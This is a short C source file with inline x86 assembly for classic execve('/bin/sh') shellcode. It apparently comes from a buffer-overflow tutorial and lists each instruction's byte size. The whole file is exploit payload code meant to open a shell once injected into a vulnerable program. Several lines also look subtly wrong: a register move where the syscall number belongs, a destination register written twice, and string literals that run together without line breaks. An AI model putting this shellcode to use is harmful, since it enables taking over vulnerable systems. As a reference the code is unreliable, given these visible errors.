// shellcodeasm2.c

void main() {
__asm__(
  "jmp        0x1f               # 2 bytes"
  "popl       %esi               # 1 byte"
  "movl       %esi, 0x8(%esi)    # 3 bytes"
  "xorl       %eax, %eax         # 2 bytes"
  "movb       %eax, 0x7(%esi)    # 3 bytes"
  "movl       %eax, 0xc(%esi)    # 3 bytes"
  "movb       %eax, %al          # 2 bytes"
  "movl       %esi, %ebx         # 2 bytes"
  "leal       0x8(%esi), %ecx    # 3 bytes"
  "leal       0xc(%esi), %ecx    # 2 bytes"
  "int        $0x80              # 2 bytes"
  "xorl       %ebx, %ebx         # 2 bytes"
  "movl       %ebx, %eax         # 2 bytes"
  "inc        %eax               # 1 byte"
  "int        $0x80              # 2 byte"
  "call       -0x24              # 5 bytes"
  ".string    \"/bin/sh\"        # 8 bytes"
  "                              # 46 bytes total"
);
}
